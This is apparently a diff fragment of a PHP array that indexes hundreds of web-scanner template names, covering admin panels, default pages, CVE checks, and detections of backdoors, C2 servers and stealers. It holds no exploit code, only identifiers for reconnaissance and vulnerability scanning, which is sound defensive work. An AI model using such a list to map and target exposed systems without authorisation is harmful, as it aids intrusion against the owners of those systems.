+        491 => 'nginx-ui-dashboard',
+        492 => 'default-nginx-page',
+        493 => 'nginx-admin-panel',
+        494 => 'nginx-auto-installer',
+        495 => 'nginx-linux-page',
+        496 => 'nginx-opencloudos-test-page',
+        497 => 'nginx-version',
+        498 => 'node-express-status',
+        499 => 'puppet-node-manager-detect',
+        500 => 'unauthorized-puppet-node-manager',
+        501 => 'np-data-cache',
+        502 => 'nzbget-panel',
+        503 => 'ocomon-panel',
+        504 => 'one-identity-safeguard-spp-panel',
+        505 => 'oneinstack-control-center',
+        506 => 'opengear-panel',
+        507 => 'openremote-detect',
+        508 => 'oracle-httpserver12c',
+        509 => 'default-oracle-application-page',
+        510 => 'oracle-application-server-panel',
+        511 => 'oracle-atg-commerce',
+        512 => 'oracle-containers-panel',
+        513 => 'oracle-fusion-detect',
+        514 => 'oracle-people-enterprise',
+        515 => 'osisoft-pi-vision-panel',
+        516 => 'outline-panel',
+        517 => 'ovpn-config-exposed',
+        518 => 'openvpn-connect',
+        519 => 'pair-drop-panel',
+        520 => 'paystack-secret-live',
+        521 => 'php-debugbar-exposure',
+        522 => 'autoset-detect',
+        523 => 'php-detect',
+        524 => 'php-proxy-detect',
+        525 => 'php-zerodium-backdoor-rce',
+        526 => 'phpmemcached-admin-panel',
+        527 => 'phpnow-works',
+        528 => 'phppgadmin-panel',
+        529 => 'pingfederate-login-panel',
+        530 => 'postrest-api-exposure',
+        531 => 'prefect-detect',
+        532 => 'procore-panel',
+        533 => 'projectsend-login',
+        534 => 'projectsend-detect',
+        535 => 'prometheus-exporter',
+        536 => 'prometheus-pushgateway-exposed-panel',
+        537 => 'puppetboard-panel',
+        538 => 'qualys-cloud-platform-login',
+        539 => 'rancher-panel',
+        540 => 'rancher-dashboard',
+        541 => 'raygun-rum-detect',
+        542 => 'redcap-detector',
+        543 => 'reddittop-rss-xss',
+        544 => 'redis-commander-exposure',
+        545 => 'unauth-redis-insight',
+        546 => 'redis-enterprise-panel',
+        547 => 'remita-credentials',
+        548 => 'request-tracker-panel',
+        549 => 'rg-uac-panel',
+        550 => 'ruijie-password-leak',
+        551 => 'roundcube-webmail-portal',
+        552 => 'rubrik-panel',
+        553 => 'sailpoint-identityiq-panel',
+        554 => 'samsung-smarttv-debug',
+        555 => 'sap-successfactors-detect',
+        556 => 'satis-repository',
+        557 => 'scale-computing-hc3-panel',
+        558 => 'sceditor-detect',
+        559 => 'schneider-ecostruxure-building-operation-webstation-panel',
+        560 => 'scs-landfill-control',
+        561 => 'seldon-core-detect',
+        562 => 'selea-ip-camera',
+        563 => 'seq-dashboard-unauth',
+        564 => 'server-status',
+        565 => 'shiori-panel',
+        566 => 'shopify-app-installer',
+        567 => 'shopify-detect',
+        568 => 'signoz-panel',
+        569 => 'skeepers-panel',
+        570 => 'smtp-credentials-exposure',
+        571 => 'sophos-utm-panel',
+        572 => 'spark-webui-unauth',
+        573 => 'spiderfoot',
+        574 => 'splash-rendering-service',
+        575 => 'sportybet-api',
+        576 => 'springboot-whitelabel',
+        577 => 'squid-analysis-report-generator',
+        578 => 'star-network-utility',
+        579 => 'strapi-admin-installer',
+        580 => 'strapi-page',
+        581 => 'struts-debug-mode',
+        582 => 'CVE-2017-5638',
+        583 => 'CVE-2020-17530',
+        584 => 'apache-struts-showcase',
+        585 => 'struts-problem-report',
+        586 => 'superset-login',
+        587 => 'swarmui-panel',
+        588 => 'symfony-debug',
+        589 => 'default-symfony-page',
+        590 => 'syncthing-dashboard',
+        591 => 'system-properties-exposure',
+        592 => 'tasmota-config-webui',
+        593 => 'teamforge-panel',
+        594 => 'tekton-dashboard',
+        595 => 'telecontrol-server-basic-panel',
+        596 => 'theia-ide-panel',
+        597 => 'titannit-web-exposure',
+        598 => 'tools4ever-ssrpm-panel',
+        599 => 'tplink-r470t-panel',
+        600 => 'tup-openframe',
+        601 => 'twonky-server-exposure',
+        602 => 'unauth-etherpad',
+        603 => 'unauth-mercurial',
+        604 => 'unauth-xproxy-dashboard',
+        605 => 'unauth-zwave-mqtt',
+        606 => 'uni-gui-framework',
+        607 => 'usermin-panel',
+        608 => 'uvdesk-install',
+        609 => 'uvdesk-helpdesk-installer',
+        610 => 'v2924-admin-panel',
+        611 => 'v2x-control',
+        612 => 'vanna-panel',
+        613 => 'vivotex-web-console-detect',
+        614 => 'voila-panel',
+        615 => 'voipmonitor-panel',
+        616 => 'vtigercrm-detect',
+        617 => 'vugex-source-detect',
+        618 => 'weaviate-console-detect',
+        619 => 'web-suite-detect',
+        620 => 'webalizer-statistics',
+        621 => 'windows-communication-foundation-detect',
+        622 => 'woodpecker-ci-panel',
+        623 => 'yacht-panel',
+        624 => 'ymhome-detect',
+        625 => 'zebra-printer-detect',
+        626 => 'zend-server-test-page',
+        627 => 'zentral-panel',
+        628 => 'zte-panel',
+        629 => 'zyxel-firewall-panel',
+        630 => 'zyxel-router-panel',
+        631 => '1password-scim-panel',
+        632 => '3cx-installer',
+        633 => '3cx-phone-management-panel',
+        634 => '4D-detect',
+        635 => 'CVE-2011-2744',
+        636 => 'CVE-2015-4074',
+        637 => 'CVE-2018-8715',
+        638 => 'CVE-2019-5418',
+        639 => 'CVE-2020-8163',
+        640 => 'rack-mini-profiler',
+        641 => 'CVE-2019-7254',
+        642 => 'eMerge-panel',
+        643 => 'CVE-2021-24226',
+        644 => 'CVE-2021-24227',
+        645 => 'CVE-2021-32820',
+        646 => 'CVE-2021-39316',
+        647 => 'CVE-2022-33891',
+        648 => 'spark-panel',
+        649 => 'CVE-2024-31223',
+        650 => 'CVE-2025-13339',
+        651 => 'CVE-2026-38361',
+        652 => 'aapanel-linux-panel',
+        653 => 'acemanager-login',
+        654 => 'ackee-panel',
+        655 => 'acontent-detect',
+        656 => 'actifio-panel',
+        657 => 'activecollab-detect',
+        658 => 'activecollab-installer',
+        659 => 'activemq-panel',
+        660 => 'activepieces-panel',
+        661 => 'adapt-panel',
+        662 => 'addonfinance-portal',
+        663 => 'adguard-panel',
+        664 => 'adminset-panel',
+        665 => 'admiralcloud-detect',
+        666 => 'adobe-media-server',
+        667 => 'adonisjs-detect',
+        668 => 'aem-cms',
+        669 => 'aerocms-detect',
+        670 => 'aethra-panel',
+        671 => 'agentgpt-panel',
+        672 => 'airbyte-panel',
+        673 => 'aircube-dashboard-panel',
+        674 => 'aircube-login',
+        675 => 'akamai-bot-manager-detect',
+        676 => 'akamai-detect',
+        677 => 'akuiteo-panel',
+        678 => 'alamos-panel',
+        679 => 'alfresco-panel',
+        680 => 'allegro-rompager-panel',
+        681 => 'alternc-panel',
+        682 => 'amazon-ecs-defualt-page',
+        683 => 'ambassador-edgestack-detect',
+        684 => 'ampache-debug',
+        685 => 'ampache-panel',
+        686 => 'ampguard-wifi-setup',
+        687 => 'android-debug-database-exposed',
+        688 => 'angular-detect',
+        689 => 'ansible-tower-exposure',
+        690 => 'anythingllm-panel',
+        691 => 'apache-cloudstack-detect',
+        692 => 'apache-cocoon-detect',
+        693 => 'apache-detect',
+        694 => 'bitnami-apache-solr',
+        695 => 'default-apache2-ubuntu-page',
+        696 => 'kafka-manager-unauth',
+        697 => 'node-red-detect',
+        698 => 'apache-dubbo-detect',
+        699 => 'apache-inlong-detect',
+        700 => 'apache-ofbiz-detect',
+        701 => 'apache-pinot-detect',
+        702 => 'apache-shenyu-detect',
+        703 => 'apache-streampark-detect',
+        704 => 'apache-streampipes-detect',
+        705 => 'apache-tapestry-detect',
+        706 => 'apache-zeppelin-detect',
+        707 => 'appcms-detect',
+        708 => 'apple-cups-exposure',
+        709 => 'cups-detect',
+        710 => 'apple-httpserver',
+        711 => 'appspace-panel',
+        712 => 'aptus-panel',
+        713 => 'aqua-enterprise-panel',
+        714 => 'arcserve-panel',
+        715 => 'array-networks-ssl-vpn-panel',
+        716 => 'arthas-web-console',
+        717 => 'aspect-control-panel',
+        718 => 'aspnetmvc-version-disclosure',
+        719 => 'astrbot-panel-detect',
+        720 => 'asustor-adm-panel',
+        721 => 'asyncapi-inventory',
+        722 => 'attu-detect',
+        723 => 'milvus-detect',
+        724 => 'atvise-login',
+        725 => 'audiobookshelf-panel',
+        726 => 'authelia-panel',
+        727 => 'authentik-panel',
+        728 => 'autobahn-python-detect',
+        729 => 'automatisch-panel',
+        730 => 'avantfax-panel',
+        731 => 'avideo-detect',
+        732 => 'axel-webserver',
+        733 => 'axigen-webadmin',
+        734 => 'axigen-webmail',
+        735 => 'axway-api-manager-panel',
+        736 => 'axway-securetransport-panel',
+        737 => 'axxon-client-panel',
+        738 => 'azkaban-web-client',
+        739 => 'b2b-builder-detect',
+        740 => 'backdrop-cms-detect',
+        741 => 'baget-exposure',
+        742 => 'bamboo-detect',
+        743 => 'bedita-panel',
+        744 => 'bentoml-detect',
+        745 => 'beszel-panel',
+        746 => 'big-agi-panel',
+        747 => 'bigbluebutton-detect',
+        748 => 'bigbluebutton-login',
+        749 => 'bigcommerce-detect',
+        750 => 'bigip-detect',
+        751 => 'biotime-panel',
+        752 => 'bitbucket-panel',
+        753 => 'bitdefender-gravityzone',
+        754 => 'bitrix-detect',
+        755 => 'bitwarden-vault-panel',
+        756 => 'bizzy-panel',
+        757 => 'blogger-detect',
+        758 => 'blue-yonder-panel',
+        759 => 'boa-web-server',
+        760 => 'bonobo-server-panel',
+        761 => 'bravia-signage',
+        762 => 'browserless-debugger',
+        763 => 'bubble-detect',
+        764 => 'buddy-panel',
+        765 => 'bugzilla-detect',
+        766 => 'buildbot-panel',
+        767 => 'bulma-detect',
+        768 => 'burp-collaborator-detect',
+        769 => 'caldera-c2',
+        770 => 'caobox-cms-detect',
+        771 => 'carel-plantvisor-panel',
+        772 => 'casaos-panel',
+        773 => 'catalog-creator-detect',
+        774 => 'caton-network-manager-system',
+        775 => 'celebrus-detect',
+        776 => 'centos-eol',
+        777 => 'default-centos-test-page',
+        778 => 'chatbot-ui-panel',
+        779 => 'checkmk-login',
+        780 => 'cherrypy-detect',
+        781 => 'chevereto-detect',
+        782 => 'chirpstack-login',
+        783 => 'cisco-onprem-panel',
+        784 => 'cisco-ucs-kvm-login',
+        785 => 'cisco-unity-panel',
+        786 => 'cisco-webex-meetings-panel',
+        787 => 'citrix-honeypot-detect',
+        788 => 'cleanweb-panel',
+        789 => 'clearscada-panel',
+        790 => 'cleo-detect',
+        791 => 'cloudcenter-installer',
+        792 => 'cloudflare-access-panel',
+        793 => 'cloudflare-nginx-detect',
+        794 => 'cloudflare-speedtest',
+        795 => 'cloudlog-panel',
+        796 => 'cmseasy-crossall-sqli',
+        797 => 'cmsimple-detect',
+        798 => 'cockroachdb-detect',
+        799 => 'codesys-webvisu-panel',
+        800 => 'cogent-datahub-panel',
+        801 => 'cognita-panel',
+        802 => 'coldfusion-administrator-login',
+        803 => 'comfyui-detect',
+        804 => 'compreface-panel',
+        805 => 'concourse-ci-panel',
+        806 => 'concrete5-detect',
+        807 => 'confluence-detect',
+        808 => 'connectwise-control-detect',
+        809 => 'corebos-panel',
+        810 => 'cortex-xsoar-login',
+        811 => 'cowboy-detect',
+        812 => 'cox-business-panel',
+        813 => 'cradlepoint-gateway-panel',
+        814 => 'craft-cms-detect',
+        815 => 'craftercms-detect',
+        816 => 'crontab-ui',
+        817 => 'crypto-address-detect',
+        818 => 'cryptobox-panel',
+        819 => 'csod-panel',
+        820 => 'cubebackup-setup-installer',
+        821 => 'cudatel-panel',
+        822 => 'cvat-panel',
+        823 => 'cvent-panel-detect',
+        824 => 'cvsweb-detect',
+        825 => 'cwp-webpanel',
+        826 => 'cx-cloud-login',
+        827 => 'cyberoam-firewall-panel',
+        828 => 'cyberoam-ssl-vpn-panel',
+        829 => 'cyberpanel-panel',
+        830 => 'cyberstrikeai-panel',
+        831 => 'dahua-web-panel',
+        832 => 'dataease-panel',
+        833 => 'datagerry-panel',
+        834 => 'dbgate-panel',
+        835 => 'dbt-docs-panel',
+        836 => 'ddwrt-panel',
+        837 => 'deadbolt-ransomware',
+        838 => 'dedecms-detect',
+        839 => 'deep-sea-electronics-dse855-detect',
+        840 => 'deepmail-panel',
+        841 => 'default-apache-shiro',
+        842 => 'shiro-detect',
+        843 => 'default-apache-test-all',
+        844 => 'default-apache-test-page',
+        845 => 'default-apache2-page',
+        846 => 'default-ssltls-test-page',
+        847 => 'ibm-http-server',
+        848 => 'default-asp-net-page',
+        849 => 'default-codeigniter-page',
+        850 => 'default-django-page',
+        851 => 'django-detect',
+        852 => 'default-fastcgi-page',
+        853 => 'default-fedora-page',
+        854 => 'default-glassfish-server-page',
+        855 => 'default-iis7-page',
+        856 => 'microsoft-iis-8',
+        857 => 'default-jetty-page',
+        858 => 'jetty-showcontexts-enable',
+        859 => 'default-lucee-page',
+        860 => 'lucee-detect',
+        861 => 'lucee-stack-trace',
+        862 => 'default-movable-page',
+        863 => 'default-openresty',
+        864 => 'openresty-detect',
+        865 => 'default-parallels-plesk',
+        866 => 'default-payara-server-page',
+        867 => 'payara-micro-detect',
+        868 => 'default-plesk-page',
+        869 => 'default-redhat-test-page',
+        870 => 'default-runcloud-page',
+        871 => 'default-websphere-liberty',
+        872 => 'default-windows-server-page',
+        873 => 'dell-openmanager-login',
+        874 => 'deployment-interface-exposed',
+        875 => 'dericam-login',
+        876 => 'devexpress-detect',
+        877 => 'device42-panel',
+        878 => 'dify-panel',
+        879 => 'digi-router-panel',
+        880 => 'digitalrebar-login',
+        881 => 'directadmin-login-panel',
+        882 => 'directus-detect',
+        883 => 'discuz-panel',
+        884 => 'dizquetv-detect',
+        885 => 'docebo-elearning-panel',
+        886 => 'docker-registry-browser-detect',
+        887 => 'dockge-panel',
+        888 => 'dqs-superadmin-panel',
+        889 => 'dragonfly-panel',
+        890 => 'drawio-flowchartmaker-panel',
+        891 => 'dreambox-detect',
+        892 => 'dynamic-container-host',
+        893 => 'dynatrace-login',
+        894 => 'dzzoffice-panel',
+        895 => 'earcu-panel',
+        896 => 'easydiffusion-panel',
+        897 => 'easyscripts-installer',
+        898 => 'ecessa-panel',
+        899 => 'echelon-ilon-smartserver-panel',
+        900 => 'eclipse-birt-panel',
+        901 => 'ecology-detect',
+        902 => 'edgeos-login',
+        903 => 'efak-login-panel',
+        904 => 'ejbca-enterprise-installer',
+        905 => 'ekare-insight-panel',
+        906 => 'eko-software-update-panel',
+        907 => 'ektron-cms-panel',
+        908 => 'elfinder-detect',
+        909 => 'elfiq-panel',
+        910 => 'emby-panel',
+        911 => 'emerson-intellislot-webcard',
+        912 => 'emerson-power-panel',
+        913 => 'empirecms-detect',
+        914 => 'emqx-panel',
+        915 => 'endian-firewall-panel',
+        916 => 'endpoint-protector-panel',
+        917 => 'eos-http-browser',
+        918 => 'erxes-detect',
+        919 => 'esphome-dashboard',
+        920 => 'unauth-esphome',
+        921 => 'espocrm-detect',
+        922 => 'event-debug-server-status',
+        923 => 'eventum-panel',
+        924 => 'evidently-ai-panel',
+        925 => 'evlink-panel',
+        926 => 'evse-web-panel',
+        927 => 'exposed-kibana',
+        928 => 'kibana-panel',
+        929 => 'exposed-mcp-sse-server',
+        930 => 'exposed-sqlite-manager',
+        931 => 'ez-publish-panel',
+        932 => 'f-secure-policy-manager',
+        933 => 'fanruanoa2012-detect',
+        934 => 'faraday-login',
+        935 => 'fastgpt-panel',
+        936 => 'fastly-debug-headers',
+        937 => 'filegator-panel',
+        938 => 'firemon-asset-manager-panel',
+        939 => 'firstpromoter-detect',
+        940 => 'flink-exposure',
+        941 => 'flip-cms-panel',
+        942 => 'flock-safety-camera-panel',
+        943 => 'flowci-panel',
+        944 => 'flowise-panel',
+        945 => 'flowweb-detect',
+        946 => 'flureedb-admin-console',
+        947 => 'forcepoint-applicance',
+        948 => 'forgejo-installer',
+        949 => 'fortinet-fortianalyzer-panel',
+        950 => 'fortinet-fortiddos-panel',
+        951 => 'fortinet-fortigate-panel',
+        952 => 'fortinet-fortisandbox-panel',
+        953 => 'fortinet-panel',
+        954 => 'fossbilling-panel',
+        955 => 'frappe-framework-detect',
+        956 => 'freeipa-panel',
+        957 => 'freshrss-panel',
+        958 => 'friendica-panel',
+        959 => 'fronius-datalogger-web-panel',
+        960 => 'fronius-inverter-panel',
+        961 => 'fusionauth-admin-panel',
+        962 => 'fuxa-scada-panel',
+        963 => 'gabia-server-detect',
+        964 => 'ganglia-cluster-dashboard',
+        965 => 'ge-proficy-webspace-panel',
+        966 => 'gemweb-plus-panel',
+        967 => 'geo-webserver-detect',
+        968 => 'gerapy-detect',
+        969 => 'getsimple-cms-detect',
+        970 => 'gilacms-detect',
+        971 => 'git-web-interface',
+        972 => 'gitblit-panel',
+        973 => 'github-debug',
+        974 => 'gitlist-disclosure',
+        975 => 'gocron-panel',
+        976 => 'goliath-detect',
+        977 => 'google-bucket-service',
+        978 => 'google-calendar-exposure',
+        979 => 'google-frontend-httpserver',
+        980 => 'gotify-panel',
+        981 => 'gotweb-detect',
+        982 => 'gradio-detect',
+        983 => 'gradle-cache-node-detect',
+        984 => 'gradle-develocity-panel',
+        985 => 'gradle-enterprise-panel',
+        986 => 'grandstream-device-configuration',
+        987 => 'graphiql-detect',
+        988 => 'graphiql-exposure',
+        989 => 'graphite-browser',
+        990 => 'grav-cms-detect',
+        991 => 'greenbone-panel',
+        992 => 'growatt-shinelink-panel',
+        993 => 'gstorage-detect',
+        994 => 'gunicorn-detect',
+        995 => 'gyra-master-admin',
+        996 => 'h2o-wave-panel',
+        997 => 'hack5-cloud-c2',
+        998 => 'pupyc2',
+        999 => 'supershell-c2',
+        1000 => 'haivision-gateway-panel',
+        1001 => 'haivision-media-platform-panel',
+        1002 => 'hanwang-detect',
+        1003 => 'hashicorp-boundary-detect',
+        1004 => 'headscale-panel',
+        1005 => 'hedgedoc-detect',
+        1006 => 'helicone-panel',
+        1007 => 'helm-dashboard-exposure',
+        1008 => 'hillstone-ssl-vpn-panel',
+        1009 => 'homarr-panel',
+        1010 => 'home-assistant-panel',
+        1011 => 'homematic-panel',
+        1012 => 'honeypot-detect',
+        1013 => 'honeywell-building-control',
+        1014 => 'hookbot-rat',
+        1015 => 'mystic-stealer',
+        1016 => 'hoppscotch-panel',
+        1017 => 'hp-blade-system',
+        1018 => 'hp-media-vault-detect',
+        1019 => 'hpe-officeconnect-panel',
+        1020 => 'hp-color-laserjet-detect',
+        1021 => 'hpe-oneview-panel',
+        1022 => 'httpbin-panel',
+        1023 => 'huawei-hg532e-panel',
+        1024 => 'huawei-home-gateway',
+        1025 => 'hubble-detect',
+        1026 => 'hugegraph-detect',
+        1027 => 'hugegraph-studio-detect',
+        1028 => 'hugo-detect',
+        1029 => 'hyperplanning-panel',
+        1030 => 'i-librarian-panel',
+        1031 => 'ibm-note-login',
+        1032 => 'ibm-odm-detect',
+        1033 => 'ibm-security-access-manager',
+        1034 => 'ibm-sterling-detect',
+        1035 => 'icecast-server-detect',
+        1036 => 'ictbroadcast-panel',
+        1037 => 'identity-services-engine',
+        1038 => 'identityguard-selfservice-entrust',
+        1039 => 'ids-skills-installer',
+        1040 => 'imgproxy-detect',
+        1041 => 'impresscms-detect',
+        1042 => 'incapptic-connect-panel',
+        1043 => 'inductive-automation-ignition-panel',
+        1044 => 'inertiajs-detect',
+        1045 => 'influxdb-panel',
+        1046 => 'influxdb-version-detect',
+        1047 => 'intel-amt-detect',
+        1048 => 'intelbras-panel',
+        1049 => 'intelliflash-login-panel',
+        1050 => 'intercom',
+        1051 => 'ipdiva-mediation-panel',
+        1052 => 'iplanet-web-server',
+        1053 => 'ipswitch-imail-detect',
+        1054 => 'ispyconnect-detect',
+        1055 => 'issabel-login',
+        1056 => 'istat-panel-detect',
+        1057 => 'ivanti-connect-secure-panel',
+        1058 => 'ivanti-csa-panel',
+        1059 => 'ivanti-endpoint-manager',
+        1060 => 'ixbusweb-panel',
+        1061 => 'jalios-jcms-panel',
+        1062 => 'jamf-panel',
+        1063 => 'jamf-login',
+        1064 => 'jboss-detect',
+        1065 => 'jboss-soa-platform',
+        1066 => 'jedox-web-panel',
+        1067 => 'jeecg-boot-detect',
+        1068 => 'jellyseerr-login-panel',
+        1069 => 'jfa-go-installer',
+        1070 => 'jhipster-detect',
+        1071 => 'jira-setup',
+        1072 => 'jitsi-meet-detect',
+        1073 => 'jorani-panel',
+        1074 => 'jsf-detect',
+        1075 => 'jspxcms-detect',
+        1076 => 'juniper-panel',
+        1077 => 'jupyter-notebooks-exposed',
+        1078 => 'kafka-topics-ui',
+        1079 => 'kanboard-login',
+        1080 => 'kaseya-vsa-login-panel',
+        1081 => 'kemp-loadmaster-panel',
+        1082 => 'kettle-default-login',
+        1083 => 'kettle-panel',
+        1084 => 'keycloak-admin-panel',
+        1085 => 'khoj-detect',
+        1086 => 'kingsoft-webserver-detect',
+        1087 => 'koboldai-panel',
+        1088 => 'kodexplorer-detect',
+        1089 => 'konga-panel',
+        1090 => 'kubelet-metrics',
+        1091 => 'kubernetes-operational-view-detect',
+        1092 => 'kubernetes-mirantis',
+        1093 => 'kubeview-dashboard',
+        1094 => 'kyocera-printer-panel',
+        1095 => 'lancom-router-panel',
+        1096 => 'langflow-detect',
+        1097 => 'langfuse-panel',
+        1098 => 'langsmith-panel',
+        1099 => 'laravel-debug-error',
+        1100 => 'lenovo-fp-panel',
+        1101 => 'lenovo-thinkserver-panel',
+        1102 => 'leostream-panel',
+        1103 => 'letta-panel',
+        1104 => 'lidarr-dashboard-unauth',
+        1105 => 'liferay-portal',
+        1106 => 'limesurvey-detect',
+        1107 => 'linkerd-badrule-detect',
+        1108 => 'linkerd-service-detect',
+        1109 => 'linksys-wifi-login',
+        1110 => 'linkwarden-panel',
+        1111 => 'linshare-panel',
+        1112 => 'linux-lfi-fuzzing',
+        1113 => 'litellm-swagger-detect',
+        1114 => 'livehelperchat-detect',
+        1115 => 'livewire-detect',
+        1116 => 'lmstudio-panel',
+        1117 => 'localgpt-panel',
+        1118 => 'logrocket-rum-detect',
+        1119 => 'lollms-webui-detect',
+        1120 => 'lottie-backdoor',
+        1121 => 'polyfill-backdoor',
+        1122 => 'lua-runtime-error',
+        1123 => 'lucy-admin-panel',
+        1124 => 'm-bus-panel',
+        1125 => 'machform-admin-panel',
+        1126 => 'mageai-panel',
+        1127 => 'magento-detect',
+        1128 => 'magento-eol',
+        1129 => 'maltrail-panel',
+        1130 => 'manageengine-adaudit',
+        1131 => 'manageengine-assetexplorer',
+        1132 => 'manageengine-servicedesk',
+        1133 => 'manageengine-supportcenter',
+        1134 => 'marqo-detect',
+        1135 => 'materialize-css-detect',
+        1136 => 'maxkb-panel',
+        1137 => 'meilisearch-detect',
+        1138 => 'memos-panel',
+        1139 => 'meshcentral-login',
+        1140 => 'meteor-takeover',
+        1141 => 'metube-detect',
+        1142 => 'mezzanine-cms-detect',
+        1143 => 'mfiles-web-detect',
+        1144 => 'microfocus-admin-server',
+        1145 => 'microsoft-iis-version',
+        1146 => 'ms-adcs-detect',
+        1147 => 'microsoft-sharepoint-detect',
+        1148 => 'mikrotik-httpproxy',
+        1149 => 'miniupnpd-detect',
+        1150 => 'mirth-connect-detect',
+        1151 => 'misconfigured-concrete5',
+        1152 => 'mitel-panel-detect',
+        1153 => 'mlflow-panel',
+        1154 => 'mobile-management-panel',
+        1155 => 'mochiweb-detect',
+        1156 => 'modoboa-panel',
+        1157 => 'moinmoin-detect',
+        1158 => 'mojoportal-detect',
+        1159 => 'molgenis-panel',
+        1160 => 'mongoose-server',
+        1161 => 'monitorr-panel',
+        1162 => 'monstra-installer',
+        1163 => 'monstracms-detect',
+        1164 => 'morningstar-prostar-mppt-detect',
+        1165 => 'moveit-transfer-detect',
+        1166 => 'moxa-mxview-panel',
+        1167 => 'mpftvc-admin-panel',
+        1168 => 'mura-cms-setup-installer',
+        1169 => 'mylittleadmin-panel',
+        1170 => 'mylittlebackup-panel',
+        1171 => 'nagios-logserver-panel',
+        1172 => 'nagios-xi-panel',
+        1173 => 'nagvis-panel',
+        1174 => 'navicat-server-panel',
+        1175 => 'nconf-panel',
+        1176 => 'neo4j-neodash-detect',
+        1177 => 'neobox-panel',
+        1178 => 'neos-detect',
+        1179 => 'nessus-panel',
+        1180 => 'netdata-dashboard-detect',
+        1181 => 'netflix-conductor-ui',
+        1182 => 'netgate-pfsenseplus-panel',
+        1183 => 'netris-dashboard-panel',
+        1184 => 'netsweeper-webadmin-panel',
+        1185 => 'nextchat-detect',
+        1186 => 'nextcloudpi-dashboard',
+        1187 => 'nextjs-vite-public-env',
+        1188 => 'nexus-panel',
+        1189 => 'ni-web-based-panel',
+        1190 => 'nicegui-detect',
+        1191 => 'nimplant-c2',
+        1192 => 'nimsoft-wasp',
+        1193 => 'nmon-login-panel',
+        1194 => 'nocobase-detect',
+        1195 => 'noescape-login',
+        1196 => 'nordex-wind-farm-portal',
+        1197 => 'nostromo-detect',
+        1198 => 'notion-detect',
+        1199 => 'nperf-server-detect',
+        1200 => 'nport-web-console',
+        1201 => 'nsq-admin-panel',
+        1202 => 'nuage-networks-vsp-panel',
+        1203 => 'nuuo-network-login',
+        1204 => 'o2-easy-panel',
+        1205 => 'ocs-inventory-login',
+        1206 => 'ocserv-panel',
+        1207 => 'octobercms-detect',
+        1208 => 'octoprint-3dprinter',
+        1209 => 'octoprint-installer',
+        1210 => 'octoprint-panel',
+        1211 => 'officekeeper-admin-login',
+        1212 => 'okta-panel',
+        1213 => 'olivetti-crf-detect',
+        1214 => 'ollama-llm-panel',
+        1215 => 'oneblog-detect',
+        1216 => 'onion-website-supported',
+        1217 => 'tor-socks-proxy',
+        1218 => 'onlyoffice-login-panel',
+        1219 => 'open-journal-systems',
+        1220 => 'openbmcs-detect',
+        1221 => 'openbullet2-panel',
+        1222 => 'opencart-detect',
+        1223 => 'opencats-panel',
+        1224 => 'openclaw-control-detect',
+        1225 => 'opendcim-detect',
+        1226 => 'openedge-panel',
+        1227 => 'openfire-admin-panel',
+        1228 => 'openhands-panel',
+        1229 => 'openllm-panel',
+        1230 => 'openmetadata-detect',
+        1231 => 'opennebula-panel',
+        1232 => 'openproject-detect',
+        1233 => 'openscada-panel',
+        1234 => 'opensign-panel',
+        1235 => 'opensis-detect',
+        1236 => 'openspeedtest-speedtest',
+        1237 => 'openssl-detect',
+        1238 => 'opentext-contentserver-panel',
+        1239 => 'openvas-panel',
+        1240 => 'openvz-web-login',
+        1241 => 'openwebui-panel',
+        1242 => 'openwrt-login',
+        1243 => 'operations-automation-default-page',
+        1244 => 'opnhap-detect',
+        1245 => 'opnsense-panel',
+        1246 => 'opto22-groov-panel',
+        1247 => 'oracle-access-management',
+        1248 => 'oracle-dbcs',
+        1249 => 'oracle-iplanet-web-server',
+        1250 => 'oracle-opera-login',
+        1251 => 'orangehrm-panel',
+        1252 => 'orangescrum-install',
+        1253 => 'orchard-installer',
+        1254 => 'orchid-vms-panel',
+        1255 => 'oscommerce-detect',
+        1256 => 'osnexus-panel',
+        1257 => 'osticket-panel',
+        1258 => 'ourmgmt3-panel',
+        1259 => 'outback-power-detect',
+        1260 => 'owasp-juice-shop-detect',
+        1261 => 'pagespeed-detect',
+        1262 => 'pahtool-panel',
+        1263 => 'paloalto-expedition-panel',
+        1264 => 'parallels-hsphere-detect',
+        1265 => 'payloadcms-detect',
+        1266 => 'payroll-management-system-panel',
+        1267 => 'pbootcms-detect',
+        1268 => 'pcoweb-panel',
+        1269 => 'pdf-signer-ssti-to-rce',
+        1270 => 'pega-web-panel',
+        1271 => 'peplink-incontrol-panel',
+        1272 => 'permissions-installer',
+        1273 => 'perplexica-panel',
+        1274 => 'persis-panel',
+        1275 => 'pexip-detect',
+        1276 => 'pfsense-login',
+        1277 => 'pghero-detect',
+        1278 => 'phoenix-contact-charx-panel',
+        1279 => 'phoronix-panel',
+        1280 => 'php-fusion-detect',
+        1281 => 'php-mailer',
+        1282 => 'phpldapadmin-panel',
+        1283 => 'phplist-detect',
+        1284 => 'pichome-panel',
+        1285 => 'pinata-api-key',
+        1286 => 'piwigo-detect',
+        1287 => 'piwigo-panel',
+        1288 => 'plantumlserver-detect',
+        1289 => 'plone-cms-detect',
+        1290 => 'pocketbase-detect',
+        1291 => 'polycom-hdx-web-exposure',
+        1292 => 'polynote-panel',
+        1293 => 'portainer-panel',
+        1294 => 'powercom-network-manager',
+        1295 => 'powerjob-panel',
+        1296 => 'powerlogic-ion',
+        1297 => 'prestashop-detect',
+        1298 => 'privatebin-detect',
+        1299 => 'privategpt-detect',
+        1300 => 'processwire-installer',
+        1301 => 'pronote-panel',
+        1302 => 'proofpoint-protection-server-panel',
+        1303 => 'prowlarr-dashboard-unauth',
+        1304 => 'proxmox-panel',
+        1305 => 'ptc-thingworx-panel',
+        1306 => 'pulsar-admin-console',
+        1307 => 'pulsar-adminui-panel',
+        1308 => 'pure-storage-login',
+        1309 => 'pyload-panel',
+        1310 => 'pypiserver-detect',
+        1311 => 'qBittorrent-panel',
+        1312 => 'qdrant-detect',
+        1313 => 'qmail-admin-login',
+        1314 => 'qualcomm-voip-router',
+        1315 => 'qualitor-itsm-panel',
+        1316 => 'quantum-scalar-detect',
+        1317 => 'quilium-panel',
+        1318 => 'r-webserver-login',
+        1319 => 'rabbitmq-dashboard',
+        1320 => 'racksnet-login',
+        1321 => 'radarr-dashboard-unauth',
+        1322 => 'radius-manager-login',
+        1323 => 'ragflow-panel',
+        1324 => 'raritan-pdu-panel',
+        1325 => 'raspberry-shake-config',
+        1326 => 'ray-dashboard',
+        1327 => 'readarr-dashboard-unauth',
+        1328 => 'recoverpoint-panel',
+        1329 => 'red-lion-panel',
+        1330 => 'redlion-hmi-panel',
+        1331 => 'reliable-controls-panel',
+        1332 => 'remedy-axis-login',
+        1333 => 'reolink-panel',
+        1334 => 'reposilite-panel',
+        1335 => 'rethinkdb-admin-console',
